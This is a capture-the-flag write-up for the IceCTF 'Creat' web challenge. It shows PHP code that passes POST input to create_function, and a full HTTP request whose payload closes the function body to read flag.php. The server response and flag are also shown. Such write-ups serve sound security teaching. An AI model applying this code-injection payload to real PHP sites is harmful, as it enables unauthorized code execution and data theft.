
## Creat

> Our friend decided to learn programming as his quarantine project! Sadly, he chose to learn PHP, and doesn't believe in the security vulnerabilities. Help us prove him wrong!

We are given the following code:

```
<?php
ini_set('display_errors', 'on');
ini_set('error_reporting', E_ALL);

include "flag.php";

if (isset ($_POST['c']) && !empty ($_POST['c'])) {
    $fun = create_function('$flag', $_POST['c']);
        //$fun();
} else {
    highlight_file(__FILE__);
}
?>
```

the ``create_function`` part is vulnerable. Whatever we put in it is basically run through ``eval``. We can inject something in there to end the current function's body, grab the flag, and then open another function body to prevent syntax errors. Here is what the final request looks like:

```
POST / HTTP/1.1
Host: www.web-creat.vuln.icec.tf
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Connection: close
Content-Length: 44
Content-Type: application/x-www-form-urlencoded
c=}; echo file_get_contents('./flag.php'); {
```

Here is the response:

```
HTTP/1.1 200 OK
Date: Tue, 29 Dec 2020 20:50:39 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Type: text/html; charset=UTF-8
Via: 1.1 google
Connection: close
Content-Length: 133
<?php
$flag = "IceCTF{Code_injection_in_php_because_why_n0t}";
// Remove the deprecation error
error_reporting(E_ALL ^ E_DEPRECATED);
```

> IceCTF{Code_injection_in_php_because_why_n0t}
